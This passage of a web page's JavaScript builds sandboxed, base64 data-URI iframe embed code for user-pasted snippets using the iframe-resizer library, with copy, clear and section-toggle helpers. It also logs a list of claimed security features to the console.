          alert("Please enter some code first");
          return;
        }
        // Step 5b: Build HTML with iframe-resizer child included
        const fullHTML = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: https://cdn.jsdelivr.net; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;">
    <${"script"} src="https://cdn.jsdelivr.net/npm/@iframe-resizer/child@5.4.6"></${"script"}>
</head>
<body style="margin: 0;">
${code}
</body>
</html>`;

        // Step 5c: Encode to base64
        const base64Content = btoa(unescape(encodeURIComponent(fullHTML)));

        // Step 5d: Generate embed code with parent script
        const embedCode = `<!-- Secure Responsive AI Code Embed -->
<${"script"} src="https://cdn.jsdelivr.net/npm/@iframe-resizer/parent@5.4.6"></${"script"}>
<iframe 
    style="width: 100%; border: 1px solid #ddd; min-height: 100px; border-radius: 5px;" 
    sandbox="allow-scripts allow-forms allow-popups allow-modals"
    src="data:text/html;charset=utf-8;base64,${base64Content}"
    onload="
        try {
            iframeResize({
                license: 'GPLv3',
                log: false,
                checkOrigin: false
            }, this);
        } catch (e) {
            this.style.height = '500px';
        }
    ">
</iframe>`;

        // Step 5e: Display the code
        currentEmbedCode = embedCode;
        document.getElementById("embed-textarea").value = embedCode;
        document.getElementById("embed-section").style.display = "block";
      }
      function copyEmbedCode() {
        const textarea = document.getElementById("embed-textarea");
        if (!textarea.value) return;

        if (navigator.clipboard && navigator.clipboard.writeText) {
          navigator.clipboard
            .writeText(textarea.value)
            .then(function () {
              alert("âœ… Secure embed code copied to clipboard!");
            })
            .catch(function () {
              fallbackCopy(textarea.value);
            });
        } else {
          fallbackCopy(textarea.value);
        }
      }

      function selectAllCode() {
        const textarea = document.getElementById("embed-textarea");
        textarea.select();
        textarea.setSelectionRange(0, textarea.value.length);
      }

      function showSecurityTests() {
        const testsDiv = document.getElementById("security-tests");
        const button = event.target;

        if (testsDiv.style.display === "none") {
          testsDiv.style.display = "block";
          button.textContent = "ğŸ™ˆ Hide Malicious Code Examples";
        } else {
          testsDiv.style.display = "none";
          button.textContent = "ğŸ” Show Malicious Code Examples";
        }
      }

      function fallbackCopy(text) {
        const textarea = document.createElement("textarea");
        textarea.value = text;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);
        alert("âœ… Secure embed code copied to clipboard!");
      }

      function clearAll() {
        if (currentIframeResizer && currentIframeResizer.length > 0) {
          try {
            currentIframeResizer.forEach((iframe) => {
              if (iframe && iframe.iframeResizer) {
                iframe.iframeResizer.close();
              }
            });
          } catch (e) {}
          currentIframeResizer = null;
        }
        document.getElementById("ai-code").value = "";
        document.getElementById("output-section").style.display = "none";
        document.getElementById("embed-section").style.display = "none";
        document.getElementById("secure-iframe").src = "about:blank";
        document.getElementById("embed-textarea").value = "";
        currentEmbedCode = "";
      }

      // Security demonstration
      console.log("ğŸ”’ Security Features Active:");
      console.log("- Sandboxed iframe with minimal permissions");
      console.log(
        "- No same-origin access (prevents parent page manipulation)"
      );
      console.log("- No top navigation (prevents page redirects)");
      console.log("- Data URI isolation (no external requests)");
      console.log("- CSP headers for additional protection");
    </script>
  </body>
</html>
